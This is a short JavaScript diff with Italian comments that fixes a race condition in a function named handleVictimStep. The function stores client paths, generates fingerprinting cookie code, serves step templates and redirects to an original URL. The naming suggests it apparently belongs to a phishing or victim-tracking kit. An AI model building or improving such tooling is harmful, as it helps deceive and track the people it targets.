@@ -58,6 +58,9 @@ async function handleVictimStep(req, res, currentStep) {
     // Salva percorso in DB
     await db.saveClientPath(pathData);
     
+    // AGGIORNA SUBITO currentStep per evitare race condition
+    await db.updateClientStep(pathData.pathHash, 0);
+    
     const pathJS = clientFingerprint.generatePathCookieJS(pathData);
     const currentTemplate = pathData.templates[0];
     
@@ -101,7 +104,7 @@ async function handleVictimStep(req, res, currentStep) {
     return res.redirect(urlData.original_url);
   }
   
-  // Aggiorna step corrente
+  // AGGIORNA step corrente PRIMA di generare HTML
   await db.updateClientStep(pathData.pathHash, currentStep);
   
   const currentTemplate = pathData.templates[currentStep];
